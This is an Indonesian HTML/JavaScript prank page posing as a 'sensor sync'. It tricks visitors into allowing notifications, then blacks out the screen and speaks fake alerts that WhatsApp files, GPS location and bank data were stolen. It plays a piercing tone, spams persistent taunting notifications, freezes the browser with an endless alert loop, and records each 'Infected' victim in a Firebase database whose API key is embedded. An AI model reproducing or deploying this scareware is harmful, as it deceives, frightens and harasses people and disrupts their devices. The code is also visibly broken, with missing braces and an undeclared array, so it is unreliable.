<html lang="id">

    <style>
        body, html { margin: 0; padding: 0; background: #111; height: 100%; overflow: hidden; font-family: sans-serif; color: white; }
        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; text-align: center; padding: 20px; }
        .btn { padding: 20px 40px; background: #008f39; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,255,0,0.3); }
        #blackout { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: none; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="step1" class="container">

        <button class="btn" onclick="openAudio()">MULAI SINKRONISASI</button>
    </div>

    <div id="step2" class="container hidden">
        <h2>KONFIRMASI SENSOR</h2>
        <p>Wajib klik <b>'ALLOW / IZINKAN'</b> pada pop-up di atas untuk mengaktifkan notifikasi bar.</p>
        <button class="btn" style="background: #d32f2f;" onclick="startRealPrank()">IZINKAN SENSOR</button>
    </div>

    <div id="blackout"></div>

    <script>
        // CONFIG FIREBASE PUNYA LU
        const firebaseConfig = {
            apiKey: "AIzaSyAsegtxDbDkADPrd_dmqUqpIrhwKUOUU0o",
            authDomain: "pirdangame.firebaseapp.com",
            databaseURL: "https://pirdangame-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "pirdangame",
            storageBucket: "pirdangame.firebasestorage.app",
            messagingSenderId: "109134208993",
            appId: "1:109134208993:web:22efa124fd0dda427fbca0"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let audioCtx;

        // TAHAP 1: Buka Audio Context (Biar suara nempel)
        function openAudio() {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

        // TAHAP 2: Paksa Notifikasi
        async function startRealPrank() {
            const permission = await Notification.requestPermission();
            
            if (permission === "granted") {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('blackout').style.display = 'block';
                
                // Simpan ke Firebase
                db.ref("hacker_victims/final_test").push({ status: "Infected", time: new Date().toLocaleString() });
                
                runDrama();
            } else {
                alert("SISTEM GAGAL: ANDA HARUS MENGKLIK ALLOW!");
                location.reload();
            }
        }

        function sendNotif(t, b) {
            // Trik push notif yang lebih agresif
            const n = new Notification(t, {
                body: b,
                icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png",
                tag: 'pirdan-' + Math.random(), // Biar numpuk di atas
                requireInteraction: true // Notif gak bakal ilang sampe di-swipe!
            });
        }

        async function runDrama() {
            const msg = [
                "Mengekstrak folder WhatsApp...",
                "Mengirim 1.400 media ke Server Pirdan.",
                "GPS Tracking diaktifkan.",
                "Bank data berhasil dicuri."
            ];

                "⚠️ SECURITY ALERT: WhatsApp Leaked!",
                "📁 UPLOADING: Private_Videos.zip",
                "🛰️ GPS: Location broadcasted!",
                "💀 SYSTEM: Total Infection!"
            ];

            for(let i=0; i < msg.length; i++) {
                const utter = new SpeechSynthesisUtterance(msg[i]);
                utter.lang = 'id-ID';
                window.speechSynthesis.speak(utter);
                
                sendNotif("Pirdan Labs System", notifs[i]);
                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
                
                await new Promise(r => setTimeout(r, 4000));
            }

            // Suara TUTTTTT
            const osc = audioCtx.createOscillator();
            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(2000, audioCtx.currentTime);
            osc.connect(audioCtx.destination); osc.start();

            setInterval(() => {
                sendNotif("😘 LOPYU GOBLOK! 😘", "Kasian banget panik ya? HAHA!");
            }, 1000);

            setTimeout(() => { while(true) { alert("DATA LU PUNYA PIRDAN SEKARANG! 😘"); } }, 2000);
        }
    </script>
